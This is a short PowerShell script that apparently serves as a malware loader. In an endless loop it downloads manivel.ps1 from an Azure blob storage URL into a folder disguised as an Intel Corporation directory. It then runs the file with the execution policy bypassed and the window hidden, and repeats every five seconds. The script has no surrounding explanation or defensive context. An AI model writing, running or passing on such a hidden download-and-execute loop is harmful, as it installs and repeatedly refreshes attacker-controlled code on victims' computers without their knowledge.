while($true)
{
    try {
        Remove-Item "C:\ProgramData\Intel Corporation\manivel.ps1"
    }catch {}
    try {
        Invoke-WebRequest "https://previewps.blob.core.windows.net/ftp/manivel.ps1" -OutFile "C:\ProgramData\Intel Corporation\manivel.ps1"
    }catch {}
    try {
        powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File "C:\ProgramData\Intel Corporation\manivel.ps1"
    }catch {}

    Start-Sleep -Seconds 5
}